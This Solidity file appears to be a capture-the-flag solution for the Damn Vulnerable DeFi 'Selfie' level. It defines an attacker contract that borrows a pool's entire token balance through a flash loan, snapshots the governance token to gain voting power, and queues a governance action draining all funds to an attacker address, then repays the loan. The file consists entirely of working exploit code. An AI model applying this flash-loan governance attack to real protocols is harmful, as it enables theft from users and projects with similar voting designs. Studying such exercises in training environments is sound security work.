// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract HackSelfiePool {

    DamnValuableTokenSnapshot public dvtToken;
    SelfiePool public pool;
    SimpleGovernance public governance;
    address public attackerAddress;

    constructor(
        address _selfiePoolAddress,
        address _dvtTokenAddress,
        address _governanceAddress,
        address _attackerAddress
    ) {
        pool = SelfiePool(_selfiePoolAddress);
        dvtToken = DamnValuableTokenSnapshot(_dvtTokenAddress);
        governance = SimpleGovernance(_governanceAddress);
        attackerAddress = _attackerAddress;
    }

    function hack() external {
        uint256 borrowAmount = dvtToken.balanceOf(address(pool));
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address tokenAddress, uint256 amt) public {

        // Snapshot the governance token
        dvtToken.snapshot();

        // Queue governance action
        governance.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                attackerAddress
            ),
            0
        );

        // Repay the flashloan
        dvtToken.transfer(address(pool), amt);
    }

}
